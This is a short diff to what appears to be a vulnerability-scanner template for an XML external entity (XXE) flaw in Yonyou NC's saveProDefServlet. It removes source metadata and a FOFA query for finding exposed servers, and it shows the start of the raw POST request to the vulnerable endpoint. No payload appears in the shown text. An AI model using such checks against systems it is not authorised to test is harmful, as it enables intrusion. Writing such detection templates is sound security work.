@@ -3,12 +3,8 @@ info:
   name: 用友NC saveProDefServlet XML实体注入(XXE)漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gxvt1z4r0mqd0if6'
+  description: ''
   tags: xxe,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gxvt1z4r0mqd0if6
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1
